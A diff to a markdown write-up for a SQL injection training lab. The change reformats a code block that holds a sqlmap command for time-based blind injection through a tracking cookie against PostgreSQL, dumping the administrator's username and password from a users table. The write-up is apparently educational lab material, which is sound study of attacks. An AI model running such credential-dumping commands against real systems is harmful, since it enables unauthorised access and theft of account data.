@@ -115,7 +115,8 @@ too much time taking lab , we will do it with the least time-taking method
 1. we use sql map on our terminal and type the following command to get our result 
 2. intercept the traffic on burp suite and send it to the *Repeater* 
 3. command -->
-		```sqlmap -u "host_address" \
+```bash
+sqlmap -u "host_address" \
        --cookie="TrackingId=*; session=session_id" \
        --dbms=PostgreSQL \
        --technique=T \
@@ -127,8 +128,8 @@ too much time taking lab , we will do it with the least time-taking method
        --no-cast \
        --dump -T users -C username,password \
        --where="username='administrator'"
-		```
-4. after a successful injection it gives us the username and password as required ! 
+```
+1. after a successful injection it gives us the username and password as required ! 
 # Lab: SQL injection with filter bypass via XML encoding
 in this lab we need to POST to get the credentials 
 # Solution
